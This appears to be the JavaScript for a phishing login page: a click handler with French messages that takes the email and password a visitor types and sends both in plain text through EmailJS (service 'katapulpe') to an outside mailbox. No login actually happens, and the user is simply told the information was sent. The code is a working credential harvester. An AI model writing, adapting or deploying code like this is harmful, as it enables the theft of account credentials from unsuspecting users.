// app.js

document.getElementById('login-button').addEventListener('click', function() {
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value.trim();

  if (!email || !password) {
    alert('Veuillez remplir tous les champs.');
    return;
  }

  emailjs.send("katapulpe", "template", {
    user_email: email,
    user_password: password
  })
  .then(function(response) {
    console.log('Email envoyé avec succès !', response.status, response.text);
    alert('Informations envoyées avec succès !');
  }, function(error) {
    console.error('Erreur lors de l\'envoi de l\'email :', error);
    alert('Erreur lors de l\'envoi. Merci de réessayer.');
  });
});
